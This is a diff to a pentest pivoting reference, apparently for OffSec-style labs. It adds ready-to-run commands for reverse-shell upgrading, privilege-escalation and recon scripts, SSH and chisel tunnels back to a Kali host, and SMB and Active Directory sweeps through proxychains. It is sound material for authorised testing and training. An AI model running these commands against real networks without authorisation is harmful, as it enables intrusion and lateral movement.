@@ -126,6 +126,14 @@ session        # select the agent
 ifconfig       # confirm internal interface
 start          # activate tunnel
 
+# Verify tunnel (from Kali):
+nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>
+
+# Step 5 — enumerate internal network:
+./recon.sh --auto <INTERNAL_HOST_IP>          # full recon on internal target
+./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'         # if domain-joined
+nxc smb <SUBNET>/24 --gen-relay-list /tmp/smb_hosts.txt   # find SMB hosts
+
 # Need reverse shells through this tunnel?
 # → pivotr.sh listener --port 4444
 ```
@@ -192,6 +200,17 @@ python3 -m http.server 4444
 
 > [!important] Shell catchers use Penelope with `-O` (OffSec-safe flag) — not netcat.
 
+**Once a reverse shell lands on Kali:**
+```bash
+# Upgrade shell first (on remote host):
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+
+# Then enumerate the internal host from Kali:
+./recon.sh --auto <INTERNAL_HOST_IP>   # note IP from shell, run recon
+./escalatr.sh                              # run directly on the remote host
+```
+
 ---
 
 ## Mode: `ssh` — SSH Tunnel Reference
@@ -207,6 +226,11 @@ ssh -N -D 0.0.0.0:9999 www-data@10.10.10.5 -p 22
 
 # proxychains.conf:
 socks5 127.0.0.1 9999
+
+# Verification commands are printed after tunnel setup:
+proxychains -q curl -s http://172.16.1.10          # HTTP reachability
+proxychains -q nxc smb 172.16.1.0/24               # SMB sweep
+proxychains -q nmap -sT -Pn -p 80,443,445 172.16.1.10  # port check (must use -sT -Pn)
 ```
 
 ### Local Port Forward
@@ -220,6 +244,11 @@ socks5 127.0.0.1 9999
 # Run ON KALI:
 ssh -N -L 0.0.0.0:13389:172.16.1.10:3389 user@10.10.10.5 -p 22
 # Access: localhost:13389
+
+# Verification commands are printed after tunnel setup:
+curl -s http://localhost:13389        # HTTP services
+nc -zv localhost 13389                # TCP check (non-HTTP)
+# If not working: check ssh is running, ufw status, confirm pivot routing
 ```
 
 ### Remote Port Forward (pivot initiates)
@@ -230,6 +259,15 @@ ssh -N -L 0.0.0.0:13389:172.16.1.10:3389 user@10.10.10.5 -p 22
 # Run ON PIVOT:
 ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@KALI_IP
 # Requires: sudo systemctl start ssh (on Kali)
+
+# Verify tunnel works (run on Kali after pivot connects):
+nc -zv localhost 8080                    # TCP port check
+curl -s --connect-timeout 3 http://localhost:8080  # if HTTP
+
+# Debug if tunnel fails:
+# Confirm pivot SSH outbound to Kali: nc -zv KALI_IP 22 (from pivot)
+# Check Kali sshd GatewayPorts: grep GatewayPorts /etc/ssh/sshd_config
+# Check local port is bound: ss -tlnp | grep 8080
 ```
 
 ### Reverse Dynamic SOCKS (pivot initiates)
@@ -282,6 +320,17 @@ socks5 127.0.0.1 9999
 ```bash
 # Start chisel server on Kali immediately
 ./pivotr.sh chisel --type socks --start-server
+```
+
+**Verify SOCKS proxy (after pivot connects):**
+```bash
+proxychains -q nxc smb <INTERNAL_SUBNET>/24          # SMB sweep
+proxychains -q curl -s http://<INTERNAL_IP>           # HTTP test
+proxychains -q nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>  # port check (must use -sT -Pn)
+
+# Then enumerate through the proxy:
+proxychains ./recon.sh --auto <INTERNAL_IP>
+proxychains ./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'  # if AD
 ```
 
 ### Port Forward
